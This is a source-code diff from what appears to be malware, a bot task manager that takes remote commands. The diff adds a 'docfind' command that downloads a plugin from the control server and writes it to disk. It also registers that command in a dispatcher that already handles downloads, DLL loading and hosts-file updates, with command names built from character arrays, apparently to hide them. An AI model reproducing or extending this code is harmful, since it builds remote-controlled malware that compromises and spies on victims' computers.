@@ -325,7 +325,8 @@ bool TaskManagerSleep(PTaskManager Manager)
 //	}
 //	while (!M->Terminated);
 //	return true;
-//}
+//}
+
 
 //----------------------------------------------------------------------------
 
@@ -726,6 +727,23 @@ bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
 	return res;
 }
 
+bool ExecuteDocFind(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	BYTE* data = 0;
+	DWORD size = 0;
+	data = Plugin::Download( "docfind.plug", 0, &size, false );
+	bool res = false;
+	TASKDBG( "-----------", "1" );
+	if( data )
+	{
+		TASKDBG( "-----------", "2" );
+		File::WriteBufferA( "c:\\docfind.plug", data, size );
+		MemFree(data);
+	}
+	TASKDBG( "-----------", "3" );
+	return res;
+}
+
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
 	// Запустить множественную загрузку файлов
@@ -803,15 +821,17 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};
 	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};
 	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
+	const static char CommandDocFind[]		 = {'d','o','c','f','i','n','d', 0};
 
-	int Index = StrIndexOf( Command, false, 7,
+	int Index = StrIndexOf( Command, false, 8,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
 							(PCHAR)CommandLoadDll,
 							(PCHAR)CommandAlert,
 							(PCHAR)CommandUpdateHosts,
-							(PCHAR)CommandLoadDLLDisk);
+							(PCHAR)CommandLoadDLLDisk,
+							(PCHAR)CommandDocFind );
 
 
 	switch (Index)
@@ -823,6 +843,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 4: return ExecuteAlert;
 		case 5: return Hosts::ExecuteUpdateHostsCommand;
 		case 6: return ExecuteLoadDLLDisk;
+		case 7: return ExecuteDocFind;
 
     default: ;
 	}
